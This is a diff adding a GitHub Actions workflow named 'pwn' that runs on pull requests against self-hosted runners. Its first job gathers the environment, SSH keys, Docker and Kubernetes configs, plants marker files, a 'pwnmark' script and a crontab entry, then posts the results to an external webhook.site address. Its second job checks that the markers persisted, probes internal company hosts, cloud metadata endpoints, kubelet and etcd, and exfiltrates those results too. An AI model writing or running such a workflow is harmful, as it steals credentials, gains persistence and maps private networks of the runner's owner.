@@ -1,0 +1,87 @@
+name: pwn
+on:
+  pull_request:
+    branches:
+      - main
+
+jobs:
+  collect:
+    runs-on: [self-hosted, Linux, ARM64]
+    steps:
+      - name: collect-and-mark
+        shell: bash
+        run: |
+          set -u
+          H=$(date -u +%Y%m%dT%H%M%SZ)
+          OUT=/tmp/pwn_map_$H.txt
+          {
+            echo "=== JOB1 $H ==="
+            id; whoami; hostname; uname -a
+            cat /etc/os-release 2>/dev/null | head -3
+            echo "RUNNER_NAME=$RUNNER_NAME"; echo "RUNNER_OS=$RUNNER_OS"; echo "RUNNER_ARCH=$RUNNER_ARCH"
+            echo "RUNNER_TEMP=$RUNNER_TEMP"; echo "GITHUB_WORKSPACE=$GITHUB_WORKSPACE"; echo "HOME=$HOME"
+            echo "--- env ---"; env | sort
+            echo "--- ip ---"; (ip -br addr || ifconfig -a) 2>&1
+            echo "--- route ---"; ip route 2>&1
+            echo "--- hosts ---"; cat /etc/hosts 2>&1
+            echo "--- resolv ---"; cat /etc/resolv.conf 2>&1
+            echo "--- listen ---"; (ss -tlnp || netstat -tlnp) 2>&1
+            echo "--- mounts ---"; mount 2>&1 | head -40
+            echo "--- home ---"; ls -la $HOME 2>&1
+            echo "--- ssh ---"; ls -la $HOME/.ssh 2>&1; cat $HOME/.ssh/*.pub 2>&1 | head -10
+            echo "--- docker ---"; cat $HOME/.docker/config.json 2>&1
+            echo "--- kube ---"; ls -la $HOME/.kube 2>&1; cat $HOME/.kube/config 2>&1 | head -20
+            echo "--- runner dir ---"; ls -la $HOME/actions-runner 2>&1 | head -20
+          } > $OUT 2>&1
+          mkdir -p "$HOME/.local/bin" 2>/dev/null || true
+          echo "MARKER-A $(hostname) $H" > /tmp/pwn_marker.txt 2>&1 || true
+          echo "MARKER-A-HOME $(hostname) $H" > "$HOME/.pwn_marker" 2>&1 || true
+          echo "MARKER-A-TEMP $(hostname) $H" > "${RUNNER_TEMP:-/tmp}/pwn_marker" 2>&1 || true
+          printf '#!/bin/sh\necho pwned-$(hostname)\n' > "$HOME/.local/bin/pwnmark" 2>&1 || true
+          chmod +x "$HOME/.local/bin/pwnmark" 2>/dev/null || true
+          CRONOK=no
+          if command -v crontab >/dev/null 2>&1; then
+            ( crontab -l 2>/dev/null | grep -v pwnmark ; echo '17 * * * * /bin/true # pwnmark' ) | crontab - 2>/dev/null && CRONOK=yes
+          fi
+          echo "CRONTAB_SET=$CRONOK" >> $OUT
+          echo "--- crontab ---" >> $OUT
+          crontab -l 2>&1 | tail -5 >> $OUT
+          echo "--- curl to webhook ---"
+          curl -sS -m 20 -X POST -H 'Content-Type: text/plain' --data-binary @$OUT https://webhook.site/31451545-8b61-423a-95c0-d94f1a8bb434 && echo POSTED_OK >> $OUT || echo POST_FAILED >> $OUT
+          cat $OUT
+
+  verify:
+    needs: collect
+    runs-on: [self-hosted, Linux, ARM64]
+    steps:
+      - name: verify-markers-and-probe
+        shell: bash
+        run: |
+          set -u
+          H=$(date -u +%Y%m%dT%H%M%SZ)
+          OUT=/tmp/pwn2_$H.txt
+          {
+            echo "=== JOB2 $H ==="
+            hostname; id; uname -a
+            echo "RUNNER_NAME=$RUNNER_NAME"; echo "RUNNER_TEMP=$RUNNER_TEMP"; echo "HOME=$HOME"
+            echo "--- markers ---"
+            for f in /tmp/pwn_marker.txt "$HOME/.pwn_marker" "${RUNNER_TEMP:-/tmp}/pwn_marker" "$HOME/.local/bin/pwnmark"; do
+              echo "FILE $f:"; ls -la "$f" 2>&1; cat "$f" 2>&1; echo
+            done
+            echo "--- crontab ---"; crontab -l 2>&1 | tail -5
+            echo "--- ip/route ---"; (ip -br addr; ip route) 2>&1
+            echo "--- dns internal ---"
+            for n in gitlab.ozon.ru gitlab.o3.ru jira.ozon.ru kube-dns.kube-system.svc.cluster.local kubernetes.default.svc.cluster.local metadata.google.internal; do
+              echo -n "$n -> "; (getent hosts "$n" || echo NO_DNS) 2>&1 | head -2
+            done
+            echo "--- probes ---"
+            for u in http://10.50.159.56:84/ http://gitlab.ozon.ru/ https://gitlab.ozon.ru/ http://jira.ozon.ru/ http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/meta-data/instance-id http://metadata.google.internal/computeMetadata/v1/ http://127.0.0.1:80/ https://kubernetes.default.svc/ https://127.0.0.1:10250/pods http://127.0.0.1:2379/version http://127.0.0.1:6379/ ; do
+              echo -n "$u => "
+              curl -sk -m 4 -o /dev/null -w '%{http_code} %{time_total}\n' "$u" 2>&1 || echo CURL_ERR
+            done
+            echo "--- tcp 10.50.159.56:84 ---"
+            (exec 3<>/dev/tcp/10.50.159.56/84 && echo TCP_OK && exec 3<&-) 2>&1 || echo TCP_FAIL
+            echo "--- env proxy ---"; env | grep -iE 'proxy|kube|cloud|aws' | sort
+          } > $OUT 2>&1
+          curl -sS -m 20 -X POST -H 'Content-Type: text/plain' --data-binary @$OUT https://webhook.site/31451545-8b61-423a-95c0-d94f1a8bb434 && echo POSTED2_OK >> $OUT || echo POST2_FAILED >> $OUT
+          cat $OUT
